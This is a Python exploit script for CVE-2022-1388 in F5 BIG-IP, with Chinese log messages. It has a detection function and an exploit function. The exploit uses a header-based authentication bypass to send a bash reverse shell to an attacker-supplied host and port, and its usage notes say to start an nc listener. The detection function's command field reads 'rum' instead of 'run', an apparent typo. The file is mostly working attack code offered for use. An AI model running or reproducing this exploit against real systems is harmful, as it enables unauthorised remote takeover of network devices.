#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import json
import fire
from loguru import logger

import requests

class F5BigIp(object):
	"""
	
	Usage:
		python3 CVE-2022-1388_F5-BIG-IP-RCE.py f5_big_ip_poc --url https://192.168.0.10
		python3 CVE-2022-1388_F5-BIG-IP-RCE.py f5_big_ip_exp --url https://192.168.0.10 --lhost 192.168.0.11 --lport 4444
	Note:
	    Do not forget to run the listener: nc -lvp 4444
	"""
	def __init__(self):
		pass

	def f5_big_ip_poc(self, url, cmd = "id"):
		"""
		F5-BIG-IP-RCE 漏洞检测脚本
		
		Reference:
			https://github.com/FeiNiao/F5-BIG-IP-RCE-vul_check
		"""
		uri = "/mgmt/tm/util/bash"
		headers = {
			"Authorization": "Basic YWRtaW46QVNhc1M=",
			"X-F5-Auth-Token": "",
			"Content-Type": "application/json"
		}
		data = {
			"command": "rum",
			"utilCmdArgs": f"-c {cmd}"
		}
		try:
			response = requests.post(
				url = url + uri,
				headers = headers,
				data = data,
				verify = False,
				timeout = 10
			)
			if response.status_code == 200 and "commandResult" in response.text:
				logger.info(f"{url} 疑似存在 F5-BIG-IP-RCE 漏洞，响应为:{json.loads(response.text)['commandResult']}")
			else:
				logger.info(f"{url} 未发现目标存在 F5-BIG-IP-RCE 漏洞")
		except Exception as e:
			logger.error(f"{url} 执行漏洞检测时发生错误 , 异常信息为 :{e}")
            
	def f5_big_ip_exp(self, url, lhost, lport):
		"""
		CVE: 2022-1388 - F5 BIG-IP - Remote Code Execution (RCE)
		Versions: 16.0.x 
		Reference:
			https://www.exploit-db.com/exploits/50932
			https://www.f5.com/products/big-ip-services
			https://github.com/yealvarez/CVE/blob/main/CVE-2022-1388/CVE-2022-1388.py
		"""
		uri = "/mgmt/tm/util/bash"
		cmd = f"-c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
		data = {
			"command": "run",
			"utilCmdArgs": f"{cmd}"
		}
		headers = {
			'Authorization': 'Basic YWRtaW46',
			'Connection':'keep-alive, X-F5-Auth-Token',
			'X-F5-Auth-Token': '0'

		}
		session = requests.Session()
		request = requests.Request('POST', url + uri, json = data, headers = headers)
		prepped = request.prepare()
		del prepped.headers['Content-Type']
		response = session.send(prepped, verify = False, timeout = 15)
		
		if response.status_code != 200:
			raise Exception(f"Failed. Status Code: {response.status_code}.")
		logger.info(f"url: {url}, status_code: {response.status_code}")
		logger.info(f"prepped_header: {prepped.headers}, response_header: {response.headers}")
		logger.info(f"response_text: {response.json()}")
 
	def main(self):
		url = "https://192.168.0.10"
		lhost = "192.168.0.11"
		lport = "4444"
		self.f5_big_ip_poc(url)
		self.f5_big_ip_exp(url, lhost, lport)

if __name__ == '__main__':
    fire.Fire(F5BigIp)